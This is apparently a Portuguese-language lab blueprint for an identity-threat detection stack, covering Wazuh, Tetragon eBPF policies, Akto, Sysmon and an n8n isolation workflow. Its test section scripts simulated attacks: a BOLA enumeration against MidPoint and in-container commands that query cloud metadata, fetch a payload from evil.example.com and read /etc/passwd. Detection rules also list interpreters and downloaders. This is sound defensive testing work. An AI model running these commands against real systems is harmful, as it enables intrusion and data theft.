# PRJ016 – Sentinel Identity Shield
## Documento de Arquitetura e Execução — Blueprint v1.0

---

| Campo              | Valor                                                     |
|--------------------|-----------------------------------------------------------|
| **Projeto**        | PRJ016 – Sentinel Identity Shield                         |
| **Versão**         | 1.0 — DRAFT para execução                                 |
| **Data**           | Abril de 2026                                             |
| **Classificação**  | Interno — Living Lab                                      |
| **Autor**          | Arquiteto de Soluções — Living Lab Fiqueok                |
| **Referências**    | REL-SEC-001-STACK-DEFENSE-v1.0 · ARQ-PRJ008-Shadow-API-v2.1 |
| **Status**         | Em execução                                               |

---

## Sumário

1. [Visão Geral e Objetivos](#1-visão-geral-e-objetivos)
2. [Desenho de Arquitetura — AS-IS e TO-BE](#2-desenho-de-arquitetura--as-is-e-to-be)
3. [Fase 1 — Levantamento de Requisitos e Pre-Flight](#3-fase-1--levantamento-de-requisitos-e-pre-flight)
4. [Fase 2 — Implementação e Configuração](#4-fase-2--implementação-e-configuração)
5. [Fase 3 — Testes de Validação e Use Cases](#5-fase-3--testes-de-validação-e-use-cases)
6. [Fase 4 — Sustentação e Governança](#6-fase-4--sustentação-e-governança)
7. [KPIs e Métricas de Sucesso](#7-kpis-e-métricas-de-sucesso)
8. [Registro de Decisões de Arquitetura (ADR)](#8-registro-de-decisões-de-arquitetura-adr)

---

## 1. Visão Geral e Objetivos

### 1.1 Declaração Estratégica

O PRJ016 – Sentinel Identity Shield tem como missão implementar uma camada de **Observabilidade de Segurança Cloud-Native** sobre o ecossistema de Governança de Identidade (IGA) do Living Lab, tratando a **identidade como o novo perímetro** de segurança em substituição ao modelo de defesa de borda de rede.

O projeto responde a um desafio arquitetural crítico: em uma rede mesh criptografada ponta a ponta (ZTNA via Tailscale), as ferramentas tradicionais de inspeção de rede (NIDS/IDS baseados em assinatura) tornam-se cegas. A solução adotada desloca a inteligência de detecção para duas camadas onde os dados trafegam descriptografados: o **kernel do sistema operacional** (via eBPF) e a **camada de aplicação** (via inspeção de APIs L7).

### 1.2 Objetivos do Projeto

| # | Objetivo | Métrica de Sucesso | Prazo |
|---|----------|--------------------|-------|
| O1 | Visibilidade 100% de chamadas de sistema nos containers IGA | Zero eventos perdidos no Tetragon exportados para Wazuh | Fase 2 |
| O2 | Descoberta de Shadow APIs não documentadas no stack OrangeHRM/MidPoint | 100% dos endpoints catalogados no Akto | Fase 2 |
| O3 | MTTD (Mean Time to Detect) de ataques BOLA < 60 segundos | Alerta no Wazuh em até 60s após simulação | Fase 3 |
| O4 | Resposta automática de isolamento de nó via Tailscale em < 2 minutos | Workflow n8n executado com sucesso em teste controlado | Fase 3 |
| O5 | Conformidade com ISO 27001 controles A.12.4 e A.12.7 | Logs assinados com retenção mínima de 30 dias | Fase 4 |

### 1.3 Alinhamento com ISO 27001

| Controle ISO 27001 | Implementação no PRJ016 |
|--------------------|-------------------------|
| **A.12.4.1** — Registro de eventos | Wazuh coletando eventos de todos os nós IGA via agentes + eBPF |
| **A.12.4.2** — Proteção da informação de log | Arquivos `archives.json` assinados em volume externo persistente |
| **A.12.4.3** — Logs de administrador e operador | Sysmon EID 4624/4625/4648 do AD encaminhados ao Wazuh |
| **A.12.7.1** — Controles de auditoria de sistemas de informação | Trilhas de auditoria geradas pelo Tetragon para cada `execve` nos namespaces IGA |
| **A.14.2.8** — Testes de segurança em sistemas | Use cases documentados na Fase 3 como evidência de teste |

### 1.4 Visão de Negócio

A conclusão do PRJ016 posiciona o Living Lab como referência de implementação de **ITDR (Identity Threat Detection and Response)** em ambiente home lab com recursos limitados. Os diferenciais demonstráveis são:

- **Zero interceptação de rede**: detecção 100% baseada em kernel e aplicação.
- **Overhead mínimo de hardware**: stack completa operando dentro de 16 GB RAM adicionais em um host i5.
- **Cobertura pós-criptografia**: visibilidade plena sobre túneis Tailscale E2EE sem decriptação.

---

## 2. Desenho de Arquitetura — AS-IS e TO-BE

### 2.1 Estado Atual (AS-IS)

```
Host Físico: i5-12400F / 64 GB RAM / Windows 11 Pro / Hyper-V
│
├── VM: ID-P-01 (OrangeHRM — Container Docker)
├── VM: ID-P-02 (Shadow API — FastAPI Container)
├── VM: ID-P-03 (MidPoint IGA — Container Docker)
├── VM: ID-P-04 (Active Directory — Windows Server)
│
└── Rede: Tailscale mesh ZTNA (E2EE entre todos os nós)
     └── SEM monitoramento de comportamento
     └── SEM visibilidade de chamadas de sistema
     └── SEM inspeção de APIs L7
```

**Lacunas identificadas no AS-IS:**
- Ausência de correlação entre eventos de identidade e comportamento de sistema.
- Shadow APIs do stack OrangeHRM → MidPoint não catalogadas.
- Nenhuma resposta automática a comportamentos anômalos no AD.
- Logs de aplicação não centralizados e sem retenção garantida.

### 2.2 Estado Futuro (TO-BE)

```
Host Físico: i5-12400F / 64 GB RAM / Windows 11 Pro / Hyper-V
│
├── ZONA IGA (workloads existentes)
│   ├── VM: OrangeHRM [Tetragon DaemonSet instalado]
│   ├── VM: Shadow API  [Tetragon DaemonSet instalado]
│   ├── VM: MidPoint    [Tetragon DaemonSet instalado]
│   └── VM: AD Windows  [Sysmon + Wazuh Agent instalados]
│
├── ZONA DEFESA (novas VMs)
│   ├── VM: SENTINEL-CORE
│   │   ├── Wazuh Manager (correlação + alertas)
│   │   └── Grafana Loki  (armazenamento de logs)
│   ├── VM: API-WATCH
│   │   └── Akto (descoberta de Shadow APIs + BOLA)
│   └── VM: AUTOMATION
│       └── n8n (SOAR — resposta automática)
│
└── PLANO DE CONTROLE
    ├── Tailscale ZTNA (ACL dinâmica via API)
    └── HashiCorp Vault (revogação de tokens)
```

### 2.3 Topologia de Telemetria

O princípio central da arquitetura TO-BE é que **nenhum componente de defesa intercepta o tráfego de produção**. Todos operam de forma passiva:

```
[Kernel do nó IGA]
       │
       ├── Tetragon hook → execve, tcp_connect, openat
       │         │
       │         └── Ring buffer eBPF (zero-copy user space)
       │                   │
       │                   └── JSON export → /var/log/tetragon/events.json
       │                                          │
       │                               Filebeat/Promtail → Wazuh Manager
       │                                                         │
[Tailscale E2EE tunnel]                               Grafana Loki
(invisível para o Tetragon —                    (armazenamento de logs)
 monitoramento ocorre ANTES
 do dado entrar no túnel)
```

**Por que o eBPF ignora a criptografia do Tailscale:**
O Tailscale opera como um processo userspace que criptografa o dado *após* ele sair da aplicação. O Tetragon, ao operar em hooks de kernel (`kprobes`), captura as chamadas de sistema *antes* que o dado chegue ao processo Tailscale. Portanto, o monitoramento é transparente ao estado de criptografia da rede.

---

## 3. Fase 1 — Levantamento de Requisitos e Pre-Flight

### 3.1 Checklist de Kernel (VMs Linux)

Execute em cada VM Ubuntu que receberá o Tetragon:

```bash
# 1. Verificar versão do kernel (mínimo: 5.10)
uname -r
# Saída esperada: 5.15.0-xxx ou superior

# 2. Verificar suporte a BPF
ls /sys/fs/bpf
# Deve retornar: cgroup  ip  net  tc  xdp

# 3. Verificar se BTF está disponível (necessário para Tetragon)
ls /sys/kernel/btf/vmlinux
# Deve existir o arquivo

# 4. Verificar cgroups v2 (recomendado para Kubernetes/Cilium)
mount | grep cgroup2
# Deve retornar linha com "cgroup2"

# 5. Verificar cap_bpf disponível
capsh --print | grep bpf
```

**Critério de aprovação:** Kernel >= 5.10 com BTF disponível. Se kernel < 5.10, execute:

```bash
sudo apt update && sudo apt install linux-image-generic-hwe-22.04 -y
sudo reboot
```

### 3.2 Requisitos de Recursos por VM

| VM | OS | vCPU | RAM | Disco | Papel |
|----|----|------|-----|-------|-------|
| SENTINEL-CORE | Ubuntu 24.04 LTS | 4 | 10 GB | 80 GB | Wazuh Manager + Grafana Loki |
| API-WATCH | Ubuntu 24.04 LTS | 2 | 4 GB | 40 GB | Akto |
| AUTOMATION | Ubuntu 24.04 LTS | 2 | 4 GB | 20 GB | n8n |
| VMs IGA existentes | Ubuntu 22.04+ | — | +512 MB cada | — | Tetragon DaemonSet (overhead) |
| VM AD | Windows Server 2022 | — | +256 MB | — | Sysmon + Wazuh Agent |

**Orçamento total adicionado:** ~18 GB RAM · 140 GB disco.
**Saldo disponível no host:** ~64 GB - 24 GB (VMs existentes) - 18 GB (novas VMs) - 4 GB (host OS) = **~18 GB de margem**.

### 3.3 Checklist de Conectividade Tailscale

```bash
# Em cada VM, verificar presença no tailnet
tailscale status
# Todas as VMs devem aparecer como "online"

# Verificar conectividade entre SENTINEL-CORE e nós IGA
tailscale ping <IP-TAILSCALE-OrangeHRM>
tailscale ping <IP-TAILSCALE-MidPoint>
tailscale ping <IP-TAILSCALE-AD>

# Verificar que porta 1514 (Wazuh) está acessível
nc -zv <IP-SENTINEL-CORE> 1514
nc -zv <IP-SENTINEL-CORE> 1515  # Enrollment port
nc -zv <IP-SENTINEL-CORE> 55000 # API port
```

### 3.4 Pré-requisitos de Software

```bash
# Em SENTINEL-CORE
sudo apt update
sudo apt install -y docker.io docker-compose curl wget jq python3-pip

# Verificar Docker
docker --version   # >= 24.x
docker compose version  # >= 2.x

# Em VMs IGA (Linux)
sudo apt update
sudo apt install -y curl helm  # Helm para deploy do Tetragon

# Verificar Helm
helm version  # >= 3.x
```

---

## 4. Fase 2 — Implementação e Configuração

### 4.1 Setup do SENTINEL-CORE (Wazuh + Loki)

#### 4.1.1 Deploy do Wazuh via Docker Compose

```bash
# Na VM SENTINEL-CORE
mkdir -p /opt/sentinel/wazuh && cd /opt/sentinel/wazuh

# Baixar configuração oficial
curl -sO https://packages.wazuh.com/4.x/docker/wazuh-docker-4.x.yml \
     -o docker-compose.yml

# Ajustar volumes para persistência fora do container
# Editar docker-compose.yml — adicionar bind mount externo:
```

```yaml
# /opt/sentinel/wazuh/docker-compose.yml (trecho crítico)
services:
  wazuh.manager:
    image: wazuh/wazuh-manager:4.9.0
    volumes:
      - /mnt/wazuh-data/ossec_api_configuration:/var/ossec/api/configuration
      - /mnt/wazuh-data/ossec_etc:/var/ossec/etc
      - /mnt/wazuh-data/ossec_logs:/var/ossec/logs      # ISO A.12.4: logs persistentes
      - /mnt/wazuh-data/ossec_queue:/var/ossec/queue
      - /mnt/wazuh-data/ossec_var_multigroups:/var/ossec/var/multigroups
      - /mnt/wazuh-data/ossec_integrations:/var/ossec/integrations
      - /mnt/wazuh-data/ossec_active_response:/var/ossec/active-response/bin
      - /mnt/wazuh-data/ossec_agentless:/var/ossec/agentless
    environment:
      - INDEXER_URL=https://wazuh.indexer:9200
      - INDEXER_USERNAME=admin
      - INDEXER_PASSWORD=${INDEXER_PASSWORD}
      - FILEBEAT_SSL_VERIFICATION_MODE=full
    ports:
      - "1514:1514/udp"
      - "1514:1514/tcp"
      - "1515:1515"
      - "55000:55000"
```

```bash
# Criar diretório de dados persistentes fora dos containers
sudo mkdir -p /mnt/wazuh-data/{ossec_logs,ossec_etc,ossec_queue}

# Iniciar stack
sudo docker compose up -d

# Verificar status
sudo docker compose ps
# Todos os serviços devem estar "healthy"
```

#### 4.1.2 Habilitação do Arquivamento de Logs (ISO 27001)

```xml
<!-- Adicionar em /mnt/wazuh-data/ossec_etc/ossec.conf -->
<ossec_config>
  <global>
    <logall>yes</logall>
    <logall_json>yes</logall_json>   <!-- Habilita archives.json assinado -->
    <memory_size>50</memory_size>
    <log_alert_level>1</log_alert_level>
  </global>
</ossec_config>
```

#### 4.1.3 Deploy do Grafana Loki

```yaml
# /opt/sentinel/loki/docker-compose.yml
version: "3.8"
services:
  loki:
    image: grafana/loki:2.9.0
    ports:
      - "3100:3100"
    volumes:
      - /mnt/loki-data:/loki                 # Volume externo persistente
      - ./loki-config.yaml:/etc/loki/local-config.yaml
    command: -config.file=/etc/loki/local-config.yaml

  grafana:
    image: grafana/grafana:10.2.0
    ports:
      - "3000:3000"
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=${GRAFANA_PASSWORD}
    volumes:
      - grafana-data:/var/lib/grafana

volumes:
  grafana-data:
```

```yaml
# /opt/sentinel/loki/loki-config.yaml
auth_enabled: false

server:
  http_listen_port: 3100

storage_config:
  filesystem:
    directory: /loki/chunks            # Diretório no volume externo

limits_config:
  retention_period: 720h               # 30 dias — mínimo ISO 27001
  ingestion_rate_mb: 16
  ingestion_burst_size_mb: 32
  max_streams_per_user: 10000

chunk_store_config:
  max_look_back_period: 720h

table_manager:
  retention_deletes_enabled: true
  retention_period: 720h
```

#### 4.1.4 Decoder e Regras Customizadas para eBPF

```xml
<!-- /mnt/wazuh-data/ossec_etc/decoders/tetragon.xml -->
<decoder name="tetragon-base">
  <prematch>{"process_exec"</prematch>
</decoder>

<decoder name="tetragon-exec">
  <parent>tetragon-base</parent>
  <regex>"binary":"(\.+?)","arguments":\["(\.+?)"\]</regex>
  <order>binary, args</order>
</decoder>

<decoder name="tetragon-network">
  <prematch>{"process_kprobe".*"tcp_connect"</prematch>
</decoder>

<decoder name="tetragon-network-detail">
  <parent>tetragon-network</parent>
  <regex>"saddr":"(\.+?)","sport":(\d+),"daddr":"(\.+?)","dport":(\d+)</regex>
  <order>src_ip, src_port, dst_ip, dst_port</order>
</decoder>
```

```xml
<!-- /mnt/wazuh-data/ossec_etc/rules/tetragon_rules.xml -->
<group name="tetragon,ebpf,iga,">

  <!-- Regra base: execução suspeita em namespace IGA -->
  <rule id="100200" level="10">
    <decoded_as>tetragon-exec</decoded_as>
    <field name="binary">^/bin/sh$|^/usr/bin/python3?$|^/usr/bin/curl$|^/usr/bin/wget$</field>
    <description>Execucao de binario interpretador em namespace IGA</description>
    <mitre><id>T1059</id></mitre>
    <group>tetragon,suspicious_exec,</group>
  </rule>

  <!-- Escalada: múltiplas execuções suspeitas em 60s -->
  <rule id="100201" level="14">
    <if_matched_sid>100200</if_matched_sid>
    <same_field>binary</same_field>
    <time_period>60</time_period>
    <frequency>3</frequency>
    <description>Execucoes repetidas suspeitas — possivel lateral movement ou C2</description>
    <mitre><id>T1059</id><id>T1071</id></mitre>
  </rule>

  <!-- Regra Akto: BOLA no MidPoint -->
  <rule id="100210" level="12">
    <decoded_as>json</decoded_as>
    <field name="integration">akto</field>
    <field name="attack_type">BOLA_MIDPOINT_USER_OID</field>
    <description>BOLA detectado pelo Akto na API do MidPoint</description>
    <mitre><id>T1078</id><id>T1087</id></mitre>
    <group>tetragon,akto,bola,itdr,</group>
  </rule>

  <!-- Correlação crítica: BOLA + execução suspeita simultânea -->
  <rule id="100211" level="15">
    <if_matched_sid>100210</if_matched_sid>
    <if_matched_sid>100200</if_matched_sid>
    <description>ITDR CRITICO: BOLA no MidPoint + execucao suspeita no mesmo periodo</description>
    <mitre><id>T1078</id><id>T1059</id></mitre>
    <group>itdr_critical,</group>
  </rule>

  <!-- Watchdog: sensor Tetragon morto -->
  <rule id="100220" level="15">
    <decoded_as>json</decoded_as>
    <field name="alert">TETRAGON_SENSOR_DEAD</field>
    <description>Tetragon parou de exportar eventos — visibilidade eBPF perdida</description>
    <group>sensor_health,critical,</group>
  </rule>

</group>
```

---

### 4.2 Configuração do Tetragon (TracingPolicies)

#### 4.2.1 Instalação via Helm

```bash
# Em cada VM Linux do stack IGA
helm repo add cilium https://helm.cilium.io
helm repo update

helm install tetragon cilium/tetragon \
  --namespace kube-system \
  --set tetragon.exportFilename=/var/log/tetragon/events.json \
  --set tetragon.enableK8sAPI=true \
  --set tetragon.grpc.address="localhost:54321" \
  --set resources.limits.memory=128Mi \
  --set resources.limits.cpu=200m \
  --set resources.requests.memory=64Mi \
  --set resources.requests.cpu=50m

# Verificar instalação
kubectl get pods -n kube-system | grep tetragon
# tetragon-xxxxx   2/2   Running   0   1m
```

#### 4.2.2 TracingPolicy para Monitoramento do Stack IGA

```yaml
# /opt/sentinel/policies/iga-syscall-audit.yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: iga-syscall-audit
  namespace: kube-system
spec:
  # Monitorar execuções de processo nos namespaces IGA
  kprobes:
  - call: "sys_execve"
    syscall: true
    args:
    - index: 0
      type: "string"       # binário executado
    - index: 1
      type: "string_array" # argumentos
    selectors:
    - matchNamespaces:
      - operator: In
        values:
          - "iga-prod"
          - "hr-services"
          - "midpoint"
    - matchBinaries:
      - operator: NotIn   # Excluir processos legítimos conhecidos
        values:
          - "/usr/bin/java"
          - "/usr/bin/node"

  # Monitorar conexões TCP de saída
  - call: "tcp_connect"
    syscall: false
    args:
    - index: 0
      type: "sock"
    selectors:
    - matchNamespaces:
      - operator: In
        values:
          - "iga-prod"
          - "hr-services"

  # Monitorar abertura de arquivos sensíveis
  - call: "sys_openat"
    syscall: true
    args:
    - index: 1
      type: "string"       # caminho do arquivo
    selectors:
    - matchNamespaces:
      - operator: In
        values: ["iga-prod"]
    - matchArgs:
      - index: 1
        operator: Prefix
        values:
          - "/etc/passwd"
          - "/etc/shadow"
          - "/var/ossec"
          - "/.ssh"
```

```bash
# Aplicar a policy
kubectl apply -f /opt/sentinel/policies/iga-syscall-audit.yaml

# Verificar que eventos estão sendo gerados
tail -f /var/log/tetragon/events.json | jq '.process_exec.binary'
```

#### 4.2.3 Promtail — Envio de Eventos para Loki + Wazuh

```yaml
# /opt/sentinel/promtail/promtail-config.yaml
server:
  http_listen_port: 9080
  grpc_listen_port: 0

positions:
  filename: /tmp/positions.yaml

clients:
  - url: http://<IP-SENTINEL-CORE>:3100/loki/api/v1/push

scrape_configs:
  - job_name: tetragon-ebpf
    static_configs:
      - targets: [localhost]
        labels:
          job: tetragon-ebpf
          host: "{{ hostname }}"
          __path__: /var/log/tetragon/events.json
    pipeline_stages:
      - json:
          expressions:
            process_exec: process_exec
            namespace:    process_exec.pod.namespace
            binary:       process_exec.binary
            pod_name:     process_exec.pod.name
      - labels:
          namespace:
          binary:
          pod_name:
      - output:
          source: process_exec
```

```bash
# Instalar e iniciar Promtail
curl -O -L https://github.com/grafana/loki/releases/download/v2.9.0/promtail-linux-amd64.zip
unzip promtail-linux-amd64.zip
sudo mv promtail-linux-amd64 /usr/local/bin/promtail
sudo chmod +x /usr/local/bin/promtail

# Criar serviço systemd
sudo tee /etc/systemd/system/promtail.service > /dev/null <<EOF
[Unit]
Description=Promtail (Tetragon → Loki)
After=network.target

[Service]
ExecStart=/usr/local/bin/promtail -config.file=/opt/sentinel/promtail/promtail-config.yaml
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl enable --now promtail
```

---

### 4.3 Configuração do Akto (API-WATCH)

#### 4.3.1 Deploy via Docker Compose

```yaml
# /opt/sentinel/akto/docker-compose.yml
version: "3.8"
services:
  mongo:
    image: mongo:5.0
    volumes:
      - mongo-data:/data/db
    restart: unless-stopped

  kafka:
    image: confluentinc/cp-kafka:7.4.0
    environment:
      KAFKA_BROKER_ID: 1
      KAFKA_ZOOKEEPER_CONNECT: zookeeper:2181
      KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://kafka:9092
    depends_on: [zookeeper]
    restart: unless-stopped

  zookeeper:
    image: confluentinc/cp-zookeeper:7.4.0
    environment:
      ZOOKEEPER_CLIENT_PORT: 2181
    restart: unless-stopped

  akto-dashboard:
    image: aktosecurity/akto-api-security-dashboard:latest
    ports:
      - "9090:9090"
    environment:
      AKTO_KAFKA_BROKER_URL: kafka:9092
      MONGO_CONN_STR: mongodb://mongo:27017
      AKTO_INSTANCE_TYPE: DASHBOARD
    depends_on: [mongo, kafka]
    restart: unless-stopped

  akto-runtime:
    image: aktosecurity/akto-api-security-runtime:latest
    environment:
      AKTO_KAFKA_BROKER_URL: kafka:9092
      AKTO_INSTANCE_TYPE: RUNTIME
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro   # Acesso passivo aos containers
    depends_on: [kafka]
    restart: unless-stopped

volumes:
  mongo-data:
```

```bash
cd /opt/sentinel/akto
sudo docker compose up -d

# Acesso ao dashboard
# http://<IP-API-WATCH>:9090
# Usuário padrão: admin@akto.io / senha configurada no primeiro acesso
```

#### 4.3.2 Configuração de Teste BOLA para MidPoint

Após acessar o dashboard do Akto, criar um Custom Test via API:

```bash
# Criar teste BOLA via API do Akto
curl -X POST http://<IP-API-WATCH>:9090/api/custom_tests \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <AKTO_API_TOKEN>" \
  -d '{
    "testName": "BOLA_MIDPOINT_USER_OID",
    "testType": "BOLA",
    "targetEndpoints": [
      "/midpoint/ws/rest/users/{oid}",
      "/midpoint/ws/rest/roles/{oid}",
      "/midpoint/ws/rest/shadows/{oid}"
    ],
    "strategy": "replace_user_id_with_other_user",
    "alertCondition": "response_200_different_user_data",
    "severity": "CRITICAL"
  }'
```

#### 4.3.3 Webhook Akto → Wazuh

```python
# /opt/sentinel/akto/webhook_receiver.py
# Executar como: python3 webhook_receiver.py (porta 8765)
from flask import Flask, request
import json, datetime

app = Flask(__name__)
WAZUH_LOG = "/var/ossec/logs/active-responses.log"

@app.route('/akto-alert', methods=['POST'])
def receive_alert():
    alert = request.json
    event = {
        "timestamp":    datetime.datetime.utcnow().isoformat(),
        "integration":  "akto",
        "attack_type":  alert.get("testName"),
        "severity":     alert.get("severity"),
        "api_endpoint": alert.get("url"),
        "affected_user": alert.get("userId"),
        "host":         alert.get("targetHost")
    }
    with open(WAZUH_LOG, 'a') as f:
        f.write(json.dumps(event) + '\n')
    return {"status": "received"}, 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8765)
```

---

### 4.4 Integração do Windows AD (Sysmon)

#### 4.4.1 Instalação do Sysmon

```powershell
# Executar no servidor AD como Administrador

# 1. Baixar Sysmon
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" `
                  -OutFile "C:\Tools\Sysmon.zip"
Expand-Archive "C:\Tools\Sysmon.zip" -DestinationPath "C:\Tools\Sysmon\"

# 2. Instalar com configuração SwiftOnSecurity (referência da comunidade)
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" `
                  -OutFile "C:\Tools\sysmonconfig.xml"

C:\Tools\Sysmon\Sysmon64.exe -accepteula -i C:\Tools\sysmonconfig.xml

# 3. Verificar instalação
Get-Service Sysmon64 | Select-Object Status, Name
# Status: Running
```

#### 4.4.2 Configuração do Wazuh Agent no Windows

```xml
<!-- C:\Program Files (x86)\ossec-agent\ossec.conf -->
<ossec_config>
  <client>
    <server>
      <address><IP-TAILSCALE-SENTINEL-CORE></address>
      <port>1514</port>
      <protocol>tcp</protocol>
    </server>
    <config-profile>windows,windows-server,windows-server-2022</config-profile>
  </client>

  <!-- Coletar eventos críticos de segurança -->
  <localfile>
    <location>Security</location>
    <log_format>eventchannel</log_format>
    <query>
      <![CDATA[
        Event/System[EventID=4624 or EventID=4625 or EventID=4648 or
                     EventID=4672 or EventID=4720 or EventID=4726]
      ]]>
    </query>
  </localfile>

  <!-- Coletar eventos do Sysmon (correlação com eBPF no Linux) -->
  <localfile>
    <location>Microsoft-Windows-Sysmon/Operational</location>
    <log_format>eventchannel</log_format>
    <query>
      <![CDATA[
        Event/System[EventID=1 or EventID=3 or EventID=7 or
                     EventID=10 or EventID=11 or EventID=22]
      ]]>
    </query>
  </localfile>
</ossec_config>
```

```powershell
# Registrar o agente no Wazuh Manager
C:\Program Files (x86)\ossec-agent\agent-auth.exe `
    -m <IP-TAILSCALE-SENTINEL-CORE> `
    -p 1515

# Reiniciar o agente
net stop WazuhSvc && net start WazuhSvc
```

---

### 4.5 Deploy do n8n (AUTOMATION)

#### 4.5.1 Instalação

```yaml
# /opt/sentinel/n8n/docker-compose.yml
version: "3.8"
services:
  n8n:
    image: n8nio/n8n:latest
    ports:
      - "5678:5678"
    environment:
      - N8N_HOST=0.0.0.0
      - N8N_PORT=5678
      - N8N_PROTOCOL=http
      - WEBHOOK_URL=http://<IP-AUTOMATION>:5678/
      - TAILSCALE_API_KEY=${TAILSCALE_API_KEY}
      - TAILNET=${TAILNET}
    volumes:
      - n8n-data:/home/node/.n8n
    restart: unless-stopped

volumes:
  n8n-data:
```

#### 4.5.2 Workflow SOAR — Isolamento via Tailscale

```json
{
  "name": "PRJ016 — Isolamento de Nó Anômalo",
  "nodes": [
    {
      "name": "Wazuh Webhook",
      "type": "n8n-nodes-base.webhook",
      "typeVersion": 1,
      "parameters": {
        "httpMethod": "POST",
        "path": "wazuh-alert",
        "responseMode": "onReceived"
      }
    },
    {
      "name": "Filtrar Severidade",
      "type": "n8n-nodes-base.if",
      "typeVersion": 1,
      "parameters": {
        "conditions": {
          "number": [
            {
              "value1": "={{ $json.rule.level }}",
              "operation": "largerEqual",
              "value2": 12
            }
          ]
        }
      }
    },
    {
      "name": "GET ACL Atual",
      "type": "n8n-nodes-base.httpRequest",
      "typeVersion": 3,
      "parameters": {
        "method": "GET",
        "url": "=https://api.tailscale.com/api/v2/tailnet/{{ $env.TAILNET }}/acl",
        "authentication": "predefinedCredentialType",
        "nodeCredentialType": "httpHeaderAuth",
        "sendHeaders": true,
        "headerParameters": {
          "parameters": [
            { "name": "Authorization", "value": "=Bearer {{ $env.TAILSCALE_API_KEY }}" }
          ]
        }
      }
    },
    {
      "name": "Script Patch ACL",
      "type": "n8n-nodes-base.code",
      "typeVersion": 2,
      "parameters": {
        "jsCode": "const acl = $('GET ACL Atual').item.json;\nconst deviceId = $('Filtrar Severidade').item.json.agent?.ip || 'unknown';\n\nconst isolationRule = {\n  action: 'deny',\n  src: ['autogroup:member'],\n  dst: [`${deviceId}:*`],\n  _comment: `SENTINEL-AUTO-ISOLATE-${new Date().toISOString()}`\n};\n\nacl.acls = [isolationRule, ...(acl.acls || [])];\nreturn { json: { acl, deviceId } };"
      }
    },
    {
      "name": "POST ACL Atualizada",
      "type": "n8n-nodes-base.httpRequest",
      "typeVersion": 3,
      "parameters": {
        "method": "POST",
        "url": "=https://api.tailscale.com/api/v2/tailnet/{{ $env.TAILNET }}/acl",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            { "name": "body", "value": "={{ JSON.stringify($json.acl) }}" }
          ]
        }
      }
    },
    {
      "name": "Revogar Token Vault",
      "type": "n8n-nodes-base.httpRequest",
      "typeVersion": 3,
      "parameters": {
        "method": "POST",
        "url": "=http://<IP-VAULT>:8200/v1/auth/token/revoke-accessor",
        "sendBody": true
      }
    },
    {
      "name": "Notificar Slack",
      "type": "n8n-nodes-base.slack",
      "typeVersion": 2,
      "parameters": {
        "channel": "#security-incidents",
        "text": "=[SENTINEL] No isolado: {{ $('Script Patch ACL').item.json.deviceId }} | Alerta: {{ $('Filtrar Severidade').item.json.rule.description }} | Horario: {{ new Date().toISOString() }}"
      }
    }
  ],
  "connections": {
    "Wazuh Webhook":        { "main": [[ {"node": "Filtrar Severidade"} ]] },
    "Filtrar Severidade":   { "main": [[ {"node": "GET ACL Atual"} ], []] },
    "GET ACL Atual":        { "main": [[ {"node": "Script Patch ACL"} ]] },
    "Script Patch ACL":     { "main": [[ {"node": "POST ACL Atualizada"} ]] },
    "POST ACL Atualizada":  { "main": [[ {"node": "Revogar Token Vault"}, {"node": "Notificar Slack"} ]] }
  }
}
```

---

## 5. Fase 3 — Testes de Validação e Use Cases

### 5.1 Use Case UC-01: Simulação de Ataque BOLA no MidPoint

**Objetivo:** Validar que o Akto detecta BOLA e o alerta chega ao Wazuh em menos de 60 segundos.

**Pré-condições:**
- Akto operacional e monitorando endpoints do MidPoint.
- Webhook Akto → Wazuh configurado e recebendo eventos.
- Dois usuários de teste criados no MidPoint: `user_a` e `user_b`.

**Procedimento de Teste:**

```bash
# 1. Autenticar como user_a e obter token
TOKEN=$(curl -s -X POST http://<MIDPOINT_URL>/midpoint/ws/rest/tokens \
  -H "Content-Type: application/json" \
  -d '{"username":"user_a","password":"test123"}' | jq -r '.token')

# 2. Simular BOLA: user_a tentando acessar OID do user_b
USER_B_OID="c0c010c0-d34d-b33f-f00d-111111111111"  # OID real do user_b

curl -v -X GET \
  "http://<MIDPOINT_URL>/midpoint/ws/rest/users/${USER_B_OID}" \
  -H "Authorization: Bearer ${TOKEN}"

# 3. Repetir com diferentes OIDs (simular enumeração)
for OID in aaa bbb ccc ddd; do
  curl -s -X GET \
    "http://<MIDPOINT_URL>/midpoint/ws/rest/users/${OID}" \
    -H "Authorization: Bearer ${TOKEN}"
  sleep 2
done
```

**Critério de Aprovação:**

```bash
# No SENTINEL-CORE, verificar alerta Wazuh em até 60s
sudo docker exec wazuh-manager \
  tail -f /var/ossec/logs/alerts/alerts.json | \
  jq 'select(.rule.id == "100210")'

# Saída esperada:
# {
#   "rule": { "id": "100210", "level": 12, "description": "BOLA detectado pelo Akto na API do MidPoint" },
#   "data": { "attack_type": "BOLA_MIDPOINT_USER_OID", "api_endpoint": "/midpoint/ws/rest/users/..." }
# }
```

**Registro de resultado:**

| Campo | Valor |
|-------|-------|
| Data de execução | _____________ |
| Tempo até detecção (s) | _____________ |
| Alerta gerado (S/N) | _____________ |
| Rule ID disparada | _____________ |
| Aprovado (S/N) | _____________ |

---

### 5.2 Use Case UC-02: Simulação de Execução Suspeita via eBPF

**Objetivo:** Validar que o Tetragon detecta execução de `curl` ou `bash` dentro do container MidPoint e o alerta atinge nível 14 no Wazuh.

**Procedimento de Teste:**

```bash
# 1. Identificar o container MidPoint em execução
kubectl get pods -n iga-prod | grep midpoint

# 2. Executar shell interativo no container (simula acesso não autorizado)
kubectl exec -it <MIDPOINT_POD> -n iga-prod -- /bin/bash

# 3. Dentro do container, executar comandos suspeitos
curl http://169.254.169.254/latest/meta-data/  # Tentativa de IMDS
wget -q http://evil.example.com/payload.sh     # Download suspeito
/bin/sh -c 'id && whoami && cat /etc/passwd'   # Enumeração
exit

# 4. Ou via kubectl sem shell interativo
kubectl exec <MIDPOINT_POD> -n iga-prod -- curl -s http://httpbin.org/ip
```

**Verificação no Tetragon:**

```bash
# Confirmar que o evento foi capturado pelo Tetragon
tail -100 /var/log/tetragon/events.json | \
